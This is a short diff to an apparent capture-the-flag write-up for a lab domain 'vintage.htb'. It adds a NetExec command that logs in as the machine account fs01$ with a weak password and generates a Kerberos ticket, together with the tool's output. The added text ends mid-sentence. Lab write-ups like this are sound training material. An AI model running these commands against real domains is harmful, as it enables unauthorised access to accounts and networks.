@@ -403,5 +403,10 @@ export KRB5CCNAME=c.neri_adm.ccache
 
 Also ill make a new ticket as `FS01$`:
 ```python
-
+nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' --generate-tgt fs01 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: fs01.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=fs01.ccache
 ```
+Now i have all the TGTs i can add `F`
